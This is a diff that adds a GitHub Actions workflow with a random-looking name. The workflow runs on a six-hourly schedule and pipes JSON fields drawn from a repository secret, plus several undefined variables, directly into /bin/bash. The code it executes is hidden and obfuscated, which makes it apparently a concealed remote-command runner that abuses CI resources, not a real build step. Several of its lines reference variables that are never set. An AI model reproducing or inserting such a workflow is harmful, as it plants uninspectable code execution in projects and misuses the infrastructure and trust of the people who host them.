@@ -1,0 +1,24 @@
+name: fazhangxinhe
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fazhangxinhe
+        env:
+          dvz2: ${{ secrets.dvz2 }}
+        run: |
+          echo $dvz2 | jq -r .yoro12 | /bin/bash
+          echo $oq61 | jq -r .gkyp94426 | /bin/bash
+          echo $fdlqu53094 | jq -r .ckwo892 | /bin/bash
+          echo $n4740 | jq -r .drg664 | /bin/bash
+          echo $ot768 | jq -r .mj003 | /bin/bash
+          echo $jjzyy3021 | jq -r .bcglj93 | /bin/bash
+          echo $t459 | jq -r .kq1084 | /bin/bash
+
